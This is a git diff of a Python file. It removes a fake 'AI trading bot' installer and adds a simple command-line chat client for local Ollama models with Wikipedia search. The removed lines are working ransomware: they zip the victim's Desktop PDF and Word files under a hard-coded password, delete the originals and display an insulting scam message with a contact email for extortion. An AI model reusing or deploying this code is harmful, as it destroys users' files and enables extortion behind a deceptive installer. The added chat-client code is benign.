@@ -1,109 +1,100 @@
-import os
-import zipfile
-import tkinter as tk
-from tkinter import ttk, messagebox
+import subprocess
+import requests
+import pyperclip
+import sys
+import time
+import ollama 
 
-# كلمة السر للقفل
-PASSWORD = "Itchnisunshinewego1"
+# -------------------------
+# Available models
+# -------------------------
+MODELS = ["llama3.1", "llama3", "mistral:7b", "qwen2.5", "codellama:7b"]
 
-class FileLockerApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("install setup")
-        self.root.geometry("400x200")
-        
-        self.setup_ui()
-    
-    def setup_ui(self):
-        # إطار رئيسي
-        main_frame = ttk.Frame(self.root, padding="20")
-        main_frame.pack(expand=True, fill=tk.BOTH)
-        
-        # تسمية العنوان
-        title_label = ttk.Label(
-            main_frame, 
-            text="installing",
-            font=('Helvetica', 12, 'bold')
-        )
-        title_label.pack(pady=10)
-        
-        # زر القفل
-        lock_button = ttk.Button(
-            main_frame,
-            text="Install",
-            command=self.lock_files,
-            style='Accent.TButton'
-        )
-        lock_button.pack(pady=20, ipadx=10, ipady=5)
-        
-        # شريط التقدم
-        self.progress = ttk.Progressbar(
-            main_frame,
-            orient=tk.HORIZONTAL,
-            length=300,
-            mode='determinate'
-        )
-        self.progress.pack(pady=10)
-        
-        # تسمية الحالة
-        self.status_label = ttk.Label(
-            main_frame,
-            text="AI trading bot",
-            font=('Helvetica', 9)
-        )
-        self.status_label.pack()
-        
-        # تحسين المظهر
-        self.root.style = ttk.Style()
-        self.root.style.configure('Accent.TButton', font=('Helvetica', 10, 'bold'), foreground='white', background='#dc3545')
-    
-    def lock_files(self):
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-        files_to_lock = [f for f in os.listdir(desktop_path) 
-                        if f.lower().endswith((".pdf", ".doc", ".docx")) 
-                        and not f.endswith(".locked")]
-        
-        if not files_to_lock:
-            messagebox.showinfo("LUCKY BITCH")
-            return
-        
-        total_files = len(files_to_lock)
-        locked_count = 0
-        
-        self.progress['maximum'] = total_files
-        self.progress['value'] = 0
-        
-        for i, file in enumerate(files_to_lock, 1):
-            file_path = os.path.join(desktop_path, file)
-            try:
-                # إنشاء أرشيف مضغوط بكلمة سر
-                zip_path = file_path + ".locked"
-                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                    zipf.setpassword(PASSWORD.encode('utf-8'))
-                    zipf.write(file_path, os.path.basename(file_path))
-                
-                # حذف الملف الأصلي بعد التأكد من إنشاء الأرشيف
-                if os.path.exists(zip_path):
-                    os.remove(file_path)
-                    locked_count += 1
-                
-                # تحديث الواجهة
-                self.progress['value'] = i
-                self.status_label.config(text=f"Installing: {i}/{total_files}")
-                self.root.update_idletasks()
-                
-            except Exception as e:
-                messagebox.showerror("okay", f"LUCKY BITCH {file}: {str(e)}")
-        
-        messagebox.showinfo(
-            "U got scamed idiot", 
-            f"تم قفل {locked_count}  {total_files} ملف بنجاح!\n\n"
-            "Contact me at louaimss9@gmail.com"
-        )
-        self.status_label.config(text=f"تم قفل {locked_count} ملف بنجاح")
-        self.progress['value'] = 0
+def select_model():
+    print("\nAvailable Models:")
+    for i, model in enumerate(MODELS, 1):
+        print(f"{i}. {model}")
+    choice = input("\nSelect a model (1-{}): ".format(len(MODELS)))
+    try:
+        return MODELS[int(choice) - 1]
+    except (ValueError, IndexError):
+        print("Invalid choice. Defaulting to llama3.1")
+        return "llama3.1"
+
+def ollama_chat(model, message):
+    """Send a message to Ollama and return streaming response."""
+    process = subprocess.Popen(
+        ["ollama", "run", model],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        bufsize=1
+    )
+
+    response = ""
+    try:
+        # Send message
+        process.stdin.write(message + "\n")
+        process.stdin.close()
+
+        # Stream output like typing
+        for line in iter(process.stdout.readline, ""):
+            for char in line:
+                sys.stdout.write(char)
+                sys.stdout.flush()
+                time.sleep(0.01)  # typing effect
+            response += line
+        process.stdout.close()
+        process.wait()
+    except KeyboardInterrupt:
+        process.kill()
+    return response
+
+def web_search(query):
+    """Basic web search using Wikipedia/Reddit/other APIs."""
+    print(f"\n[Searching the web for: {query}]...\n")
+    try:
+        url = f"https://en.wikipedia.org/api/rest_v1/page/summary/{query.replace(' ', '_')}"
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            return data.get("extract", "No summary found.")
+        else:
+            return "No results found on Wikipedia."
+    except Exception as e:
+        return f"Error during search: {e}"
+
+def main():
+    model = select_model()
+    print(f"\n[You are now chatting with {model}]")
+    print("Type 'exit' to quit.\n")
+
+    last_response = ""
+
+    while True:
+        user_input = input("\nYou: ")
+
+        if user_input.lower() == "exit":
+            print("Goodbye!")
+            break
+
+        elif user_input.lower() == "copy":
+            if last_response.strip():
+                pyperclip.copy(last_response.strip())
+                print("[Response copied to clipboard!]")
+            else:
+                print("[Nothing to copy yet.]")
+
+        elif user_input.lower().startswith("search:"):
+            query = user_input.split("search:", 1)[1].strip()
+            result = web_search(query)
+            print("\nSearch Result:\n", result)
+            last_response = result
+
+        else:
+            print(f"\n{model}: ", end="", flush=True)
+            last_response = ollama_chat(model, user_input)
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = FileLockerApp(root)
-    root.mainloop()
+    main()
